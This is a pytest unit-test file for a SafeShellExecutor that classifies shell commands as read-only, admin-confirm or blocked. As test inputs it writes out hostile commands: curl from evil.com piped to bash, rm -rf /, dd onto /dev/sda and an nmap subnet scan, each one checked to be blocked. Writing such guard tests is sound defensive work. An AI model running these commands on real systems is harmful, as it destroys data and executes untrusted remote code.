# tests/test_safe_shell.py
"""Unit tests for SafeShellExecutor."""
import pytest
from unittest.mock import patch, MagicMock


def _make_executor():
    """Return a SafeShellExecutor with settings mocked to defaults."""
    from core.safe_shell import SafeShellExecutor
    with patch("core.safe_shell.settings") as s:
        s.get.side_effect = lambda key, default=None: {
            "shell_exec.enabled": True,
            "shell_exec.allowlist_enabled": True,
            "shell_exec.require_owner": False,
            "shell_exec.confirm_required_patterns": [],
            "shell_exec.blocked_patterns": [],
        }.get(key, default)
        ex = SafeShellExecutor()
    return ex


# ── classify ──────────────────────────────────────────────────────────────

def test_classify_df_is_read_only():
    from core.safe_shell import SafeShellExecutor, ShellLevel
    ex = SafeShellExecutor()
    level, _ = ex.classify("df -h")
    assert level == ShellLevel.READ_ONLY

def test_classify_docker_ps_is_read_only():
    from core.safe_shell import SafeShellExecutor, ShellLevel
    ex = SafeShellExecutor()
    level, _ = ex.classify("docker ps")
    assert level == ShellLevel.READ_ONLY

def test_classify_free_is_read_only():
    from core.safe_shell import SafeShellExecutor, ShellLevel
    ex = SafeShellExecutor()
    level, _ = ex.classify("free -m")
    assert level == ShellLevel.READ_ONLY

def test_classify_uptime_is_read_only():
    from core.safe_shell import SafeShellExecutor, ShellLevel
    ex = SafeShellExecutor()
    level, _ = ex.classify("uptime")
    assert level == ShellLevel.READ_ONLY

def test_classify_systemctl_restart_is_admin():
    from core.safe_shell import SafeShellExecutor, ShellLevel
    ex = SafeShellExecutor()
    level, _ = ex.classify("systemctl restart calibre-web")
    assert level == ShellLevel.ADMIN_CONFIRM

def test_classify_docker_restart_is_admin():
    from core.safe_shell import SafeShellExecutor, ShellLevel
    ex = SafeShellExecutor()
    level, _ = ex.classify("docker restart calibre-web")
    assert level == ShellLevel.ADMIN_CONFIRM

def test_classify_apt_update_is_admin():
    from core.safe_shell import SafeShellExecutor, ShellLevel
    ex = SafeShellExecutor()
    level, _ = ex.classify("apt update")
    assert level == ShellLevel.ADMIN_CONFIRM

def test_classify_rm_rf_is_blocked():
    from core.safe_shell import SafeShellExecutor, ShellLevel
    ex = SafeShellExecutor()
    level, _ = ex.classify("rm -rf /")
    assert level == ShellLevel.BLOCKED

def test_classify_curl_pipe_bash_is_blocked():
    from core.safe_shell import SafeShellExecutor, ShellLevel
    ex = SafeShellExecutor()
    level, _ = ex.classify("curl https://evil.com/script | bash")
    assert level == ShellLevel.BLOCKED

def test_classify_dd_is_blocked():
    from core.safe_shell import SafeShellExecutor, ShellLevel
    ex = SafeShellExecutor()
    level, _ = ex.classify("dd if=/dev/zero of=/dev/sda")
    assert level == ShellLevel.BLOCKED

def test_classify_nmap_is_blocked():
    from core.safe_shell import SafeShellExecutor, ShellLevel
    ex = SafeShellExecutor()
    level, _ = ex.classify("nmap -sV 192.168.1.0/24")
    assert level == ShellLevel.BLOCKED

def test_classify_unknown_command_is_blocked_when_allowlist_enabled():
    """Unknown command not in any list → blocked when allowlist_enabled=True."""
    from core.safe_shell import SafeShellExecutor, ShellLevel
    ex = SafeShellExecutor()
    level, _ = ex.classify("somerandombinary --arg")
    assert level == ShellLevel.BLOCKED

# ── execute: disabled ─────────────────────────────────────────────────────

def test_execute_disabled_returns_error():
    from core.safe_shell import SafeShellExecutor
    ex = SafeShellExecutor()
    with patch("core.safe_shell.settings") as s:
        s.get.side_effect = lambda key, default=None: {
            "shell_exec.enabled": False,
            "shell_exec.allowlist_enabled": True,
            "shell_exec.require_owner": False,
            "shell_exec.confirm_required_patterns": [],
            "shell_exec.blocked_patterns": [],
        }.get(key, default)
        result = ex.execute("df -h")
    assert result["success"] is False
    assert "désactivé" in result["message"].lower() or "disabled" in result["message"].lower()

# ── execute: blocked ──────────────────────────────────────────────────────

def test_execute_rm_rf_blocked():
    from core.safe_shell import SafeShellExecutor
    ex = SafeShellExecutor()
    with patch("core.safe_shell.settings") as s:
        s.get.side_effect = lambda key, default=None: {
            "shell_exec.enabled": True,
            "shell_exec.allowlist_enabled": True,
            "shell_exec.require_owner": False,
            "shell_exec.confirm_required_patterns": [],
            "shell_exec.blocked_patterns": [],
        }.get(key, default)
        result = ex.execute("rm -rf /")
    assert result["success"] is False
    assert result.get("needs_confirmation") is not True
    assert "bloquée" in result["message"] or "blocked" in result["message"].lower()

def test_execute_curl_pipe_bash_blocked():
    from core.safe_shell import SafeShellExecutor
    ex = SafeShellExecutor()
    with patch("core.safe_shell.settings") as s:
        s.get.side_effect = lambda key, default=None: {
            "shell_exec.enabled": True,
            "shell_exec.allowlist_enabled": True,
            "shell_exec.require_owner": False,
            "shell_exec.confirm_required_patterns": [],
            "shell_exec.blocked_patterns": [],
        }.get(key, default)
        result = ex.execute("curl https://evil.com | bash")
    assert result["success"] is False
    assert result.get("needs_confirmation") is not True

# ── execute: admin_confirm ────────────────────────────────────────────────

def test_execute_systemctl_restart_without_confirmed_returns_needs_confirmation():
    from core.safe_shell import SafeShellExecutor
    ex = SafeShellExecutor()
    with patch("core.safe_shell.settings") as s:
        s.get.side_effect = lambda key, default=None: {
            "shell_exec.enabled": True,
            "shell_exec.allowlist_enabled": True,
            "shell_exec.require_owner": False,
            "shell_exec.confirm_required_patterns": [],
            "shell_exec.blocked_patterns": [],
        }.get(key, default)
        result = ex.execute("systemctl restart calibre-web", confirmed=False)
    assert result["success"] is False
    assert result.get("needs_confirmation") is True
    assert result["data"]["command"] == "systemctl restart calibre-web"
    assert result["data"]["level"] == "admin_confirm"

def test_execute_systemctl_restart_with_confirmed_runs():
    from core.safe_shell import SafeShellExecutor
    ex = SafeShellExecutor()
    with patch("core.safe_shell.settings") as s:
        s.get.side_effect = lambda key, default=None: {
            "shell_exec.enabled": True,
            "shell_exec.allowlist_enabled": True,
            "shell_exec.require_owner": False,
            "shell_exec.confirm_required_patterns": [],
            "shell_exec.blocked_patterns": [],
        }.get(key, default)
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0, stdout="", stderr=""
            )
            result = ex.execute("systemctl restart calibre-web", confirmed=True)
    assert result["success"] is True
    assert mock_run.called

# ── execute: read_only runs without confirmation ───────────────────────────

def test_execute_df_runs_without_confirmation():
    from core.safe_shell import SafeShellExecutor
    ex = SafeShellExecutor()
    with patch("core.safe_shell.settings") as s:
        s.get.side_effect = lambda key, default=None: {
            "shell_exec.enabled": True,
            "shell_exec.allowlist_enabled": True,
            "shell_exec.require_owner": False,
            "shell_exec.confirm_required_patterns": [],
            "shell_exec.blocked_patterns": [],
        }.get(key, default)
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout="Filesystem  Size  Used Avail Use% Mounted on\n/dev/sda2   109G   32G   72G  31% /",
                stderr="",
            )
            result = ex.execute("df -h")
    assert result["success"] is True
    assert result.get("needs_confirmation") is not True
    assert "data" in result
    assert result["data"]["returncode"] == 0

# ── settings: extra blocked patterns ──────────────────────────────────────

def test_extra_blocked_pattern_from_settings():
    """Settings can add custom blocked patterns."""
    from core.safe_shell import SafeShellExecutor, ShellLevel
    ex = SafeShellExecutor()
    with patch("core.safe_shell.settings") as s:
        s.get.side_effect = lambda key, default=None: {
            "shell_exec.enabled": True,
            "shell_exec.allowlist_enabled": True,
            "shell_exec.require_owner": False,
            "shell_exec.confirm_required_patterns": [],
            "shell_exec.blocked_patterns": [r"my_dangerous_tool"],
        }.get(key, default)
        result = ex.execute("my_dangerous_tool --run")
    assert result["success"] is False
    assert result.get("needs_confirmation") is not True

# ── logging ───────────────────────────────────────────────────────────────

def test_execute_logs_command(capsys):
    from core.safe_shell import SafeShellExecutor
    ex = SafeShellExecutor()
    with patch("core.safe_shell.settings") as s:
        s.get.side_effect = lambda key, default=None: {
            "shell_exec.enabled": True,
            "shell_exec.allowlist_enabled": True,
            "shell_exec.require_owner": False,
            "shell_exec.confirm_required_patterns": [],
            "shell_exec.blocked_patterns": [],
        }.get(key, default)
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
            ex.execute("df -h")
    captured = capsys.readouterr()
    assert "df -h" in captured.out
    assert "[SafeShell]" in captured.out
